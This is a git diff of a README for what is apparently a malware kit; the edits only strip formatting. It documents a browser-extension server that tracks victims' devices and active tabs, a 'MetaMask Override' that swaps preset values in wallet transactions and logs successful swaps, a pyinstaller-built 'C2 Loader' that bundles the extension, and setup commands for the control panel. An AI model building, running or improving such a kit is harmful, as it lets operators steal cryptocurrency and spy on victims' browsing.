@@ -18,7 +18,7 @@
 
 ---
 
-## Extension Server (`server/`)
+## Extension Server (server/)
 
 ### Authorization Data
 
@@ -29,15 +29,15 @@
 
 Displays statistics of connected devices:
 
-* **Status** (online / offline)
-* **Identifier** (device tag)
+* **Status** online / offline
+* **Identifier** device tag
 * **URL** of the active tab
 * **Title** of the active tab
 * **Timestamp**
 
 ### MetaMask Override
 
-1. Specify **10 preset swap values** in `configmeta.json`.
+1. Specify 10 preset swap values in configmeta.json.
 2. Successful swaps are logged in a table showing:
 
    * Device **Status**
@@ -46,18 +46,18 @@ Displays statistics of connected devices:
 
 ### Extension Panel
 
-* Real-time **randomizer** output (shown to the user whether or not it was swapped)
+* Real-time **randomizer** output(shown to the user whether or not it was swapped
 * Enter preset values **by groups**
 * View **history** of randomizer swaps
 * See the **last generated number**
 
 ### Settings
 
-Change the panel’s login/password (stored in `configpass.json`).
+Change the panels login/password stored in configpass.json.
 
 ---
 
-##  Loader Build / C2 Loader (`loader/`)
+##  Loader Build / C2 Loader (loader/)
 
 ### Installer Commands
 
@@ -135,30 +135,30 @@ pyinstaller --onefile --add-data "extension;extension" loadwin.py
 
 ## Quick Start (LoaderPanel)
 
-```bash
-# Init Node project
+```
+Init Node project
 npm init -y
 
-# Install npm-check globally
+Install npm-check globally
 npm install -g npm-check
 
-# Install missing deps
+Install missing deps
 npm-check --install
 
-# Verify
+Verify
 npm-check --install
 
-# Run
+Run
 npm start
-# Panel URL
-# http://localhost/
+Panel URL
+http://localhost/
 ```
 
 Uses **MongoDB** – recommended GUI: *MongoDB Compass*.
 
 ---
 
-## Full Pack Scripts (`scrypt/`)
+## Full Pack Scripts (scrypt/)
 
 | Folder      | Description                                                                |
 | ----------- | -------------------------------------------------------------------------- |
